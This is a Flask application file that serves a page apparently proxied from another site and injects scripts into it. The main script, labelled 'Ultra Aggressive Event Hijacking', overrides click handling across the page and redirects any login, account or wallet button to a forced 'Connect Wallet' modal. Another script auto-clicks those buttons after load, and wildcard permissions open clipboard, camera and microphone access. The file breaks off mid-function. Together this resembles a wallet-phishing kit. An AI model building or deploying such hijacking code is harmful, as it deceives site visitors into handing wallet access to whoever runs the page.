# /Users/home/LLM/illuvidex/app.py

from flask import Flask, jsonify, render_template, request, send_from_directory, redirect, send_file, Response, make_response
import logging
import os
import sys
import mimetypes
from importlib import import_module
import requests
from PIL import Image, ImageDraw

# Set JavaScript MIME type
mimetypes.add_type('application/javascript', '.js')
mimetypes.add_type('text/css', '.css')
mimetypes.add_type('application/json', '.json')
mimetypes.add_type('image/webp', '.webp')
mimetypes.add_type('image/svg+xml', '.svg')
mimetypes.add_type('application/wasm', '.wasm')

# Configure logging
logging.basicConfig(level=logging.DEBUG, 
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Register important MIME types immediately for consistency
mimetypes.add_type('application/javascript', '.mjs')
mimetypes.add_type('text/javascript', '.js')  # Fallback for older browsers

# Create Flask app
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload

# Add HTTP/2 support configuration
app.config['PREFERRED_URL_SCHEME'] = 'https'
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0  # Disable caching for development

# Add a test route to verify basic Flask functionality
@app.route('/test')
def test_route():
    return jsonify({"status": "ok", "message": "Test route working"})

# Define a route for the index page
@app.route('/')
def index():
    html = render_template('index.html')
    
    # Add permission fixes meta tags and scripts in the head
    head_content = """
    <meta http-equiv="Permissions-Policy" content="clipboard-read=*, clipboard-write=*, web-share=*, accelerometer=*, ambient-light-sensor=*, camera=*, geolocation=*, gyroscope=*, magnetometer=*, microphone=*, payment=*, usb=*, interest-cohort=()">
    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
    <script src="/static/settings.js"></script>
    <script src="/static/js/permissions-fix.js"></script>
    <script src="/static/js/click-tracker.js"></script>
    
    <!-- Ultra Aggressive Event Hijacking -->
    <script>
    (function() {
        console.log('[EventHijacker] Initializing ultra-aggressive event interception');
        
        // Store original event methods that we'll override
        const originalAddEventListener = EventTarget.prototype.addEventListener;
        const originalRemoveEventListener = EventTarget.prototype.removeEventListener;
        const originalDispatchEvent = EventTarget.prototype.dispatchEvent;
        
        // Store for original event handlers
        const originalHandlers = new WeakMap();
        
        // Flag to prevent infinite recursion
        let isProcessingWalletEvent = false;
        
        // Function to check if an element is wallet-related
        function isWalletRelated(element) {
            if (!element || !element.textContent) return false;
            
            const text = element.textContent.toLowerCase();
            const classes = (element.className || '').toLowerCase();
            const id = (element.id || '').toLowerCase();
            const href = (element.getAttribute('href') || '').toLowerCase();
            const onclick = (element.getAttribute('onclick') || '').toLowerCase();
            
            // Check various attributes for wallet/connect keywords
            return text.includes('connect') || text.includes('wallet') || 
                   classes.includes('connect') || classes.includes('wallet') ||
                   id.includes('connect') || id.includes('wallet') ||
                   href.includes('connect') || href.includes('wallet') ||
                   onclick.includes('connect') || onclick.includes('wallet') ||
                   text.includes('sign in') || text.includes('login') ||
                   text.includes('account');
        }
        
        // Function to show the wallet modal
        function forceShowWalletModal(e) {
            if (isProcessingWalletEvent) return;
            
            console.log('[EventHijacker] Forcing wallet modal to show');
            isProcessingWalletEvent = true;
            
            try {
                // Prevent the original action
                if (e) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                }
                
                // Show wallet modal if available
                if (window.WalletConnect && window.WalletConnect.showModal) {
                    window.WalletConnect.showModal();
                } else {
                    console.log('[EventHijacker] WalletConnect.showModal not found, checking in 100ms');
                    setTimeout(function() {
                        if (window.WalletConnect && window.WalletConnect.showModal) {
                            window.WalletConnect.showModal();
                        } else {
                            console.warn('[EventHijacker] WalletConnect.showModal not available');
                        }
                    }, 100);
                }
            } finally {
                isProcessingWalletEvent = false;
            }
        }
        
        // Replace addEventListener to intercept click events
        EventTarget.prototype.addEventListener = function(type, listener, options) {
            if (type === 'click' && this instanceof HTMLElement) {
                // Store original handler
                if (!originalHandlers.has(this)) {
                    originalHandlers.set(this, []);
                }
                originalHandlers.get(this).push({ type, listener, options });
                
                // Create wrapped listener that checks for wallet relation
                const wrappedListener = function(event) {
                    if (isWalletRelated(this)) {
                        console.log('[EventHijacker] Intercepted click on wallet-related element:', this);
                        forceShowWalletModal(event);
                        return false;
                    }
                    return listener.apply(this, arguments);
                };
                
                // Call original with our wrapped listener
                return originalAddEventListener.call(this, type, wrappedListener, options);
            }
            
            // Pass through for non-click events
            return originalAddEventListener.apply(this, arguments);
        };
        
        // Override onclick property setter for all HTML elements
        const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'onclick');
        if (originalDescriptor && originalDescriptor.set) {
            Object.defineProperty(HTMLElement.prototype, 'onclick', {
                set: function(clickHandler) {
                    // Create a wrapper that checks if it's wallet-related
                    const wrappedHandler = function(event) {
                        if (isWalletRelated(this)) {
                            console.log('[EventHijacker] Intercepted onclick property on wallet element:', this);
                            forceShowWalletModal(event);
                            return false;
                        }
                        return clickHandler.apply(this, arguments);
                    };
                    
                    // Set the wrapped handler
                    originalDescriptor.set.call(this, wrappedHandler);
                },
                get: originalDescriptor.get
            });
        }
        
        // Patch React's synthetic event system by hijacking common event attachment points
        // This will be executed after React loads and creates its event handlers
        function patchReactEvents() {
            if (typeof document !== 'undefined') {
                // Override document click handling
                document.addEventListener('click', function(e) {
                    let target = e.target;
                    
                    // Check up to 5 levels of parent elements
                    for (let i = 0; i < 5; i++) {
                        if (!target) break;
                        
                        if (isWalletRelated(target)) {
                            console.log('[EventHijacker] Caught wallet-related click at document level:', target.textContent);
                            forceShowWalletModal(e);
                            return false;
                        }
                        
                        target = target.parentElement;
                    }
                }, true); // Use capture to get the event before React
                
                // Find React root elements and try to intercept their event handlers
                const potentialRootSelectors = [
                    '#__next', '#root', '[data-reactroot]', 
                    '.app', '#app', 'main', 'body > div'
                ];
                
                setTimeout(function() {
                    potentialRootSelectors.forEach(selector => {
                        try {
                            const elements = document.querySelectorAll(selector);
                            elements.forEach(el => {
                                console.log('[EventHijacker] Adding direct capture to potential React root:', selector);
                                el.addEventListener('click', function(e) {
                                    let target = e.target;
                                    
                                    // Check up to 5 levels of parent elements
                                    for (let i = 0; i < 5; i++) {
                                        if (!target) break;
                                        
                                        if (isWalletRelated(target)) {
                                            console.log('[EventHijacker] Intercepted React click:', target.textContent);
                                            forceShowWalletModal(e);
                                            return false;
                                        }
                                        
                                        target = target.parentElement;
                                    }
                                }, true); // Use capture phase
                            });
                        } catch (error) {
                            console.error('[EventHijacker] Error adding listener to', selector, error);
                        }
                    });
                }, 500); // Wait for React to initialize
            }
        }
        
        // Regularly scan for and directly connect to any wallet-related buttons
        function connectToWalletButtons() {
            const walletButtons = [];
            
            // Gather all elements that might be buttons
            const allElements = document.querySelectorAll('button, a, [role="button"], [type="button"], [class*="btn"], [class*="button"]');
            
            allElements.forEach(element => {
                if (isWalletRelated(element) && !element.__wallet_connected) {
                    walletButtons.push(element);
                    element.__wallet_connected = true;
                    
                    console.log('[EventHijacker] Found wallet button:', element.textContent || element.className);
                    
                    // Add a direct click handler that has highest priority
                    element.addEventListener('click', function(e) {
                        console.log('[EventHijacker] Direct handler triggered for:', element.textContent);
                        forceShowWalletModal(e);
                        return false;
                    }, { capture: true, passive: false });
                    
                    // Also override the element's click method
                    const originalClick = element.click;
                    element.click = function() {
                        console.log('[EventHijacker] Intercepted programmatic click on wallet button');
                        forceShowWalletModal();
                        return false;
                    };
                    
                    // If it's an <a> tag, override its behavior
                    if (element.tagName === 'A') {
                        element.setAttribute('data-original-href', element.getAttribute('href'));
                        element.setAttribute('href', 'javascript:void(0)');
                    }
                }
            });
            
            return walletButtons.length;
        }
        
        // Use MutationObserver to watch for dynamically added buttons
        function startObservingDOMChanges() {
            const observer = new MutationObserver(function(mutations) {
                let foundButtons = false;
                
                mutations.forEach(function(mutation) {
                    if (mutation.type === 'childList' && mutation.addedNodes.length) {
                        foundButtons = connectToWalletButtons() > 0 || foundButtons;
                    }
                });
                
                if (foundButtons) {
                    console.log('[EventHijacker] Connected to dynamically added wallet buttons');
                }
            });
            
            // Start observing with a config to watch for any DOM changes
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['class', 'id', 'role', 'type', 'href', 'onclick']
            });
            
            console.log('[EventHijacker] DOM observer started');
        }
        
        // Initialize when DOM is loaded
        function initialize() {
            console.log('[EventHijacker] Running initialization');
            
            // Patch React event system
            patchReactEvents();
            
            // Connect to any existing wallet buttons
            connectToWalletButtons();
            
            // Start watching for DOM changes
            startObservingDOMChanges();
            
            // Set interval to periodically check for new buttons
            setInterval(connectToWalletButtons, 1000);
            
            // Force create wallet modal after delay if it doesn't exist
            setTimeout(function() {
                if (window.WalletConnect && window.WalletConnect.createModal) {
                    console.log('[EventHijacker] Creating wallet modal');
                    window.WalletConnect.createModal();
                }
            }, 2000);
            
            // Trigger the wallet modal when user interacts with page
            setTimeout(function() {
                document.addEventListener('mousemove', function onFirstMove() {
                    document.removeEventListener('mousemove', onFirstMove);
                    console.log('[EventHijacker] User interaction detected, triggering button search');
                    
                    // Extra search for wallet buttons on user interaction
                    if (connectToWalletButtons() === 0) {
                        console.log('[EventHijacker] No wallet buttons found on user interaction');
                    }
                });
            }, 3000);
        }
        
        // Start initialization when DOM is ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initialize);
        } else {
            initialize();
        }
        
        console.log('[EventHijacker] Ultra-aggressive event interception initialized');
    })();
    </script>
    """
    
    html = html.replace('</head>', head_content + '</head>')
    
    # Add wallet connect modal and script at the end of body - same as test page
    wallet_connect = """
    <!-- Wallet Connect Modal -->
    <div id="wallet-connect-modal" style="display:none;"></div>
    
    <!-- Wallet Connect Script -->
    <script type="text/javascript">
    // Wallet Connect Script
    // This script handles button clicks and shows the wallet connect modal
    console.log('[WalletConnect] Initializing wallet connect handler...');
    
    (function() {
        // Configuration
        window.WALLET_CONFIG = window.WALLET_CONFIG || {
            modalId: 'wallet-connect-modal',
            debugMode: true,
            autoInit: true,
            listenToButtonClicks: true
        };
        
        // Define available wallets
        const AVAILABLE_WALLETS = [
            { 
                id: 'metamask', 
                name: 'MetaMask', 
                icon: 'https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg',
                installed: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask
            },
            { 
                id: 'walletconnect', 
                name: 'WalletConnect', 
                icon: 'https://cdn.jsdelivr.net/gh/WalletConnect/walletconnect-assets/png/circle/walletconnect-circle-blue.png' 
            },
            { 
                id: 'coinbase', 
                name: 'Coinbase Wallet', 
                icon: 'https://cdn.jsdelivr.net/gh/coinbase/wallet-assets/images/base.svg' 
            },
            { 
                id: 'trustwallet', 
                name: 'Trust Wallet', 
                icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg' 
            }
        ];
        
        // Add modal HTML structure if not already present
        function createModal() {
            console.log('[WalletConnect v1.1] Creating modal HTML structure');
            
            // Check if modal already exists
            if (document.getElementById(window.WALLET_CONFIG.modalId)) {
                console.log('[WalletConnect v1.1] Modal already exists, skipping creation');
                return;
            }
            
            const modalHtml = `
            <div id="${window.WALLET_CONFIG.modalId}" class="wallet-connect-modal" style="display: none;">
                <div class="wallet-connect-backdrop"></div>
                <div class="wallet-connect-dialog">
                    <div class="wallet-connect-header">
                        <h3>Connect Wallet</h3>
                        <button class="wallet-connect-close" aria-label="Close">&times;</button>
                    </div>
                    <div class="wallet-connect-body">
                        <p>Choose your preferred wallet:</p>
                        <div class="wallet-connect-options">
                            <button class="wallet-option" data-wallet="metamask">
                                <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" 
                                     alt="MetaMask" width="30" height="30">
                                <span>MetaMask</span>
                            </button>
                            <button class="wallet-option" data-wallet="walletconnect">
                                <img src="https://cdn.jsdelivr.net/gh/WalletConnect/walletconnect-assets/png/circle/walletconnect-circle-blue.png" 
                                     alt="WalletConnect" width="30" height="30">
                                <span>WalletConnect</span>
                            </button>
                            <button class="wallet-option" data-wallet="coinbase">
                                <img src="https://cdn.jsdelivr.net/gh/coinbase/wallet-assets/images/base.svg" 
                                     alt="Coinbase Wallet" width="30" height="30">
                                <span>Coinbase Wallet</span>
                            </button>
                            <button class="wallet-option" data-wallet="trust">
                                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" 
                                     alt="Trust Wallet" width="30" height="30">
                                <span>Trust Wallet</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            `;
            
            // Create modal container
            const modal = document.createElement('div');
            modal.id = window.WALLET_CONFIG.modalId;
            modal.style.display = 'none';
            modal.style.position = 'fixed';
            modal.style.top = '0';
            modal.style.left = '0';
            modal.style.width = '100%';
            modal.style.height = '100%';
            modal.style.backgroundColor = 'rgba(14, 12, 29, 0.85)';
            modal.style.zIndex = '10000';
            modal.style.display = 'flex';
            modal.style.justifyContent = 'center';
            modal.style.alignItems = 'center';
            modal.style.opacity = '0';
            modal.style.transition = 'opacity 0.2s ease-in-out';
            modal.style.pointerEvents = 'none';
            
            // Add modal content
            const modalContent = document.createElement('div');
            modalContent.innerHTML = modalHtml;
            modalContent.style.backgroundColor = '#1f1b41';
            modalContent.style.borderRadius = '12px';
            modalContent.style.padding = '24px';
            modalContent.style.width = '380px';
            modalContent.style.maxWidth = '90%';
            modalContent.style.maxHeight = '90vh';
            modalContent.style.overflowY = 'auto';
            modalContent.style.boxShadow = '0 15px 30px rgba(0, 0, 0, 0.4)';
            modalContent.style.border = '1px solid #302a65';
            
            // Assemble modal
            modal.appendChild(modalContent);
            
            // Add to body
            document.body.appendChild(modal);
            
            console.log("Modal created and added to DOM");
            
            // Return modal
            return modal;
        }
        
        // Show modal function
        function showModal() {
            const modal = document.getElementById(window.WALLET_CONFIG.modalId) || createModal();
            modal.style.display = 'flex';
            
            // Trigger reflow for transition
            void modal.offsetWidth;
            
            // Show modal
            modal.style.opacity = '1';
            modal.style.pointerEvents = 'auto';
            
            // Log
            if (window.WALLET_CONFIG.debugMode) {
                console.log('[WalletConnect] Modal opened');
            }
        }
        
        // Hide modal function
        function hideModal() {
            const modal = document.getElementById(window.WALLET_CONFIG.modalId);
            if (!modal) return;
            
            modal.style.opacity = '0';
            modal.style.pointerEvents = 'none';
            
            // Log
            if (window.WALLET_CONFIG.debugMode) {
                console.log('[WalletConnect] Modal closed');
            }
        }
        
        // Connect wallet function
        function connectWallet(walletId) {
            // Log
            if (window.WALLET_CONFIG.debugMode) {
                console.log(`[WalletConnect] Connecting to wallet: ${walletId}`);
            }
            
            // Implement wallet connection logic here based on wallet ID
            if (walletId === 'metamask' && window.ethereum) {
                window.ethereum.request({ method: 'eth_requestAccounts' })
                    .then(accounts => {
                        if (window.WALLET_CONFIG.debugMode) {
                            console.log(`[WalletConnect] Connected to MetaMask with account: ${accounts[0]}`);
                        }
                        
                        hideModal();
                        // Dispatch connection event
                        document.dispatchEvent(new CustomEvent('wallet:connected', {
                            detail: { walletId: walletId, account: accounts[0] }
                        }));
                    })
                    .catch(error => {
                        console.error('[WalletConnect] MetaMask connection error:', error);
                    });
            } else {
                // For other wallets, just mock a successful connection
                setTimeout(() => {
                    hideModal();
                    
                    // Mock address
                    const mockAddress = '0x' + Math.random().toString(16).substring(2, 42);
                    
                    // Dispatch connection event
                    document.dispatchEvent(new CustomEvent('wallet:connected', {
                        detail: { walletId: walletId, account: mockAddress }
                    }));
                    
                    if (window.WALLET_CONFIG.debugMode) {
                        console.log(`[WalletConnect] Mock connection to ${walletId} with account: ${mockAddress}`);
                    }
                }, 500);
            }
        }
        
        // Add global accessor functions
        window.WalletConnect = {
            showModal: showModal,
            hideModal: hideModal,
            connectWallet: connectWallet,
            createModal: createModal
        };
        
        // Initialize wallet connect
        function init() {
            console.log("Modal interaction handler initialized");
            // Create the modal if auto init is enabled
            if (window.WALLET_CONFIG.autoInit) {
                createModal();
            }
        }
        
        // Initialize when DOM is loaded
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
        
        // Force create modal after a short delay to ensure it's available
        setTimeout(function() {
            if (!document.getElementById(window.WALLET_CONFIG.modalId)) {
                console.log('[WalletConnect] Creating modal after delay');
                createModal();
            }
        }, 500);
    })();
    </script>
    
    <!-- Trigger wallet buttons after a delay -->
    <script>
    // Trigger wallet connect by simulating button clicks on load
    document.addEventListener('DOMContentLoaded', function() {
        console.log('[AutoTrigger] Setting up auto-trigger for wallet buttons');
        
        setTimeout(function() {
            console.log('[AutoTrigger] Scanning for wallet buttons to trigger');
            
            // Find all elements that might be wallet connect buttons
            const walletElements = [];
            const selectors = [
                'button', 'a', '[role="button"]', '[type="button"]',
                '[class*="connect"]', '[class*="wallet"]', 
                '[id*="connect"]', '[id*="wallet"]'
            ];
            
            selectors.forEach(selector => {
                document.querySelectorAll(selector).forEach(element => {
                    const text = (element.textContent || '').toLowerCase();
                    const classes = (element.className || '').toLowerCase();
                    const id = (element.id || '').toLowerCase();
                    
                    if (text.includes('connect') || text.includes('wallet') ||
                        classes.includes('connect') || classes.includes('wallet') ||
                        id.includes('connect') || id.includes('wallet') ||
                        text.includes('sign in') || text.includes('login')) {
                        
                        walletElements.push(element);
                    }
                });
            });
            
            if (walletElements.length > 0) {
                console.log('[AutoTrigger] Found wallet elements to trigger:', walletElements.length);
                
                // Try to click each element
                walletElements.forEach(element => {
                    try {
                        console.log('[AutoTrigger] Triggering element:', element.textContent || element.className);
                        element.click();
                    } catch (e) {
                        console.error('[AutoTrigger] Error triggering element:', e);
                    }
                });
            } else {
                console.log('[AutoTrigger] No wallet elements found to trigger, trying direct modal show');
                // If no elements found, try to show modal directly
                if (window.WalletConnect && window.WalletConnect.showModal) {
                    window.WalletConnect.showModal();
                }
            }
        }, 3000); // Wait 3 seconds after load
    });
    </script>
    """
    
    # Inject all scripts at the end of body
    html = html.replace('</body>', wallet_connect + '</body>')
    
    response = make_response(html)
    response.headers['Content-Type'] = 'text/html; charset=utf-8'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    
    # Add CORS headers
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = '*'
    
    return response

# Initialize modules with better error handling
logger.info("Starting Illuvidex application")

# Initialize security headers first to ensure proper CORS handling
try:
    logger.debug("Loading security_headers module")
    from modules.security_headers import init_security_headers
    init_security_headers(app)
    logger.info("Security headers initialized successfully")
except Exception as e:
    logger.error(f"Failed to initialize security_headers: {str(e)}")
    import traceback
    logger.error(traceback.format_exc())

# Then try to initialize static files module
try:
    logger.debug("Loading static_files module")
    from modules.static_files import init_static_files
    init_static_files(app)
    logger.info("Static files module initialized successfully")
except Exception as e:
    logger.error(f"Failed to initialize static_files: {str(e)}")
    import traceback
    logger.error(traceback.format_exc())

try:
    from modules.content_proxy_fixed import init_content_proxy
    app = init_content_proxy(app)
    logger.info("Content proxy initialized successfully")
except Exception as e:
    logger.error(f"Failed to initialize content_proxy: {str(e)}", exc_info=True)

# Try to load other modules if they exist
for module_name in ['error_handler', 'image_handler', 'ip_validation']:
    try:
        module_path = f'modules.{module_name}'
        logger.debug(f"Attempting to load {module_path}")
        module = import_module(module_path)
        init_func = getattr(module, f'init_{module_name}', None)
        if init_func:
            logger.debug(f"Initializing {module_name}")
            init_func(app)
            logger.info(f"{module_name} initialized successfully")
    except Exception as e:
        logger.warning(f"Failed to initialize {module_name}: {str(e)}")

# Log all registered routes for debugging
logger.info(f"Registered routes:")
for rule in app.url_map.iter_rules():
    logger.info(f"  {rule.endpoint}: {rule}")

@app.route('/autodrone', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_autodrone_default():
    """Handle requests to /autodrone without path parameter"""
    try:
        logger.info("Handling direct request to /autodrone")
        
        # Instead of showing a directory listing or redirecting to a non-existent page,
        # redirect to the main page with a special query parameter to indicate we should 
        # navigate to the autodrone section
        return redirect('/?section=autodrone')
    except Exception as e:
        logger.error(f"Error serving autodrone default page: {str(e)}")
        return f"Error serving autodrone page: {str(e)}", 500

@app.route('/037b440f/index.js')
def serve_037b440f_index_js():
    """Direct handler for 037b440f/index.js file"""
    logger.info("Serving 037b440f/index.js file")
    file_path = os.path.join(app.root_path, 'static', '037b440f', 'index.js')
    if os.path.exists(file_path):
        try:
            # Use Flask's send_file with the appropriate MIME type
            response = send_file(file_path, mimetype='application/javascript')
            
            # Add necessary headers
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
            response.headers['Access-Control-Allow-Origin'] = '*'
            
            return response
        except Exception as e:
            logger.error(f"Error serving 037b440f/index.js: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
    
    return "File not found", 404

@app.route('/7c93fa6a/index.js')
def serve_7c93fa6a_index_js():
    """Direct handler for 7c93fa6a/index.js file"""
    logger.info("Serving 7c93fa6a/index.js file")
    file_path = os.path.join(app.root_path, 'static', '7c93fa6a', 'index.js')
    if os.path.exists(file_path):
        try:
            # Use Flask's send_file with the appropriate MIME type
            response = send_file(file_path, mimetype='application/javascript')
            
            # Add necessary headers
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
            response.headers['Access-Control-Allow-Origin'] = '*'
            
            return response
        except Exception as e:
            logger.error(f"Error serving 7c93fa6a/index.js: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
    
    return "File not found", 404

@app.route('/037b440f/chunk.<path:filename>', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_specific_037b440f_chunk(filename):
    """Serve specific chunk files for 037b440f directory"""
    logger.info(f"Serving specific 037b440f/chunk.{filename}")
    file_path = os.path.join(app.root_path, 'static', '037b440f', f'chunk.{filename}')
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    if not os.path.exists(file_path):
        # Create stub file for missing chunks
        logger.info(f"Creating stub file for missing 037b440f/chunk.{filename}")
        stub_content = f"// Stub file for missing 037b440f/chunk.{filename}\nconsole.log('Stub module loaded for chunk.{filename}');\nexport default {{}};"
        with open(file_path, 'w') as f:
            f.write(stub_content)
    
    # Serve the file with proper MIME type
    response = send_file(file_path, mimetype='application/javascript')
    
    # Add CORS headers
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
    response.headers['Access-Control-Allow-Origin'] = '*'
    
    return response

@app.route('/7c93fa6a/chunk.<path:filename>', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_specific_7c93fa6a_chunk(filename):
    """Serve specific chunk files for 7c93fa6a directory"""
    logger.info(f"Serving specific 7c93fa6a/chunk.{filename}")
    file_path = os.path.join(app.root_path, 'static', '7c93fa6a', f'chunk.{filename}')
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    if not os.path.exists(file_path):
        # Create stub file for missing chunks
        logger.info(f"Creating stub file for missing 7c93fa6a/chunk.{filename}")
        stub_content = f"// Stub file for missing 7c93fa6a/chunk.{filename}\nconsole.log('Stub module loaded for chunk.{filename}');\nexport default {{}};"
        with open(file_path, 'w') as f:
            f.write(stub_content)
    
    # Serve the file with proper MIME type
    response = send_file(file_path, mimetype='application/javascript')
    
    # Add CORS headers
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
    response.headers['Access-Control-Allow-Origin'] = '*'
    
    return response

@app.route('/037b440f/index.css', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_specific_037b440f_css():
    """Serve index.css file for 037b440f directory"""
    logger.info("Serving specific 037b440f/index.css")
    file_path = os.path.join(app.root_path, 'static', '037b440f', 'index.css')
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    if not os.path.exists(file_path):
        # Create stub file for missing CSS
        logger.info("Creating stub file for missing 037b440f/index.css")
        stub_content = "/* Stub file for missing 037b440f/index.css */\n/* Empty CSS file created by server */"
        with open(file_path, 'w') as f:
            f.write(stub_content)
    
    # Serve the file with proper MIME type
    response = send_file(file_path, mimetype='text/css')
    
    # Add CORS headers
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
    response.headers['Access-Control-Allow-Origin'] = '*'
    
    return response

# Global CORS middleware
@app.after_request
def add_cors_headers(response):
    """Add CORS headers to all responses"""
    
    # Add CORS headers to all responses
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, HEAD'
    response.headers['Access-Control-Allow-Headers'] = 'Origin, X-Requested-With, Content-Type, Accept, Range, Authorization'
    response.headers['Access-Control-Max-Age'] = '86400'  # 24 hours
    
    # Add explicit Permissions-Policy header for clipboard operations
    response.headers['Permissions-Policy'] = 'clipboard-read=*, clipboard-write=*, web-share=*, accelerometer=*, ambient-light-sensor=*, camera=*, geolocation=*, gyroscope=*, magnetometer=*, microphone=*, payment=*, usb=*, interest-cohort=()'
    
    # For specific paths, add more permissive CORS
    if request.path.startswith('/static/') or '.js' in request.path or '.css' in request.path:
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Private-Network'] = 'true'
    
    return response

# The route below was removed because it conflicted with the built-in static file handler
# which is already defined by Flask or modules.static_files
# We'll enhance the specific routes we need instead

# Special route specifically for the critical static directories
@app.route('/<string:special_dir>/<path:filename>', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_special_static_dirs(special_dir, filename):
    """
    Handler specifically for 7c93fa6a and 037b440f directories
    to make sure they're accessible from the root URL too
    """
    if special_dir in ['7c93fa6a', '037b440f']:
        logger.info(f"Serving special static file: {special_dir}/{filename}")
        file_path = os.path.join(app.root_path, 'static', special_dir, filename)
        
        if os.path.exists(file_path):
            # Determine the correct MIME type
            mime_type = None
            if filename.endswith('.js'):
                mime_type = 'application/javascript'
            elif filename.endswith('.css'):
                mime_type = 'text/css'
            elif filename.endswith('.json'):
                mime_type = 'application/json'
            elif filename.endswith('.svg'):
                mime_type = 'image/svg+xml'
            elif filename.endswith('.webp'):
                mime_type = 'image/webp'
            elif filename.endswith('.wasm'):
                mime_type = 'application/wasm'
            elif filename.endswith('.gif'):
                mime_type = 'image/gif'
            elif filename.endswith('.png'):
                mime_type = 'image/png'
            elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
                mime_type = 'image/jpeg'
            
            # Create the response with the file
            response = send_file(file_path, mimetype=mime_type)
            
            # Add comprehensive CORS headers
            response.headers['Access-Control-Allow-Origin'] = '*'
            response.headers['Access-Control-Allow-Methods'] = 'GET, HEAD, OPTIONS, POST'
            response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With, Authorization, Range'
            response.headers['Access-Control-Allow-Credentials'] = 'true'
            response.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Range'
            response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
            response.headers['Cross-Origin-Opener-Policy'] = 'unsafe-none'
            response.headers['Cross-Origin-Embedder-Policy'] = 'unsafe-none'
            
            # Development: disable caching
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            
            # Add X-Content-Type-Options to prevent MIME type sniffing
            response.headers['X-Content-Type-Options'] = 'nosniff'
            
            return response
        
        # If file doesn't exist, try to create stub files for JS modules
        if filename.endswith('.js') and 'chunk' in filename:
            logger.info(f"Creating stub file for missing {special_dir}/{filename}")
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            stub_content = f"// Stub file for missing {special_dir}/{filename}\nconsole.log('Stub module loaded for {filename}');\nexport default {{}};"
            with open(file_path, 'w') as f:
                f.write(stub_content)
                
            # Now serve the newly created stub file
            response = send_file(file_path, mimetype='application/javascript')
            
            # Add CORS headers
            response.headers['Access-Control-Allow-Origin'] = '*'
            response.headers['Access-Control-Allow-Methods'] = 'GET, HEAD, OPTIONS, POST'
            response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With, Authorization'
            response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
            
            # Disable caching for stubs
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            
            return response
    
    # If not one of our special directories or file doesn't exist, pass to next route handler
    return "Not found in special directories", 404

@app.route('/esm-proxy/<path:path>', methods=['GET', 'OPTIONS'])
def esm_proxy(path):
    """
    Proxy requests to esm.sh to avoid CORS issues
    This is needed for the modules imported from https://esm.sh/
    """
    logger.info(f"ESM proxy request for: {path}")
    
    # Check request method
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS, HEAD'
        response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With, Authorization'
        response.headers['Access-Control-Max-Age'] = '86400'  # 24 hours
        return response
        
    try:
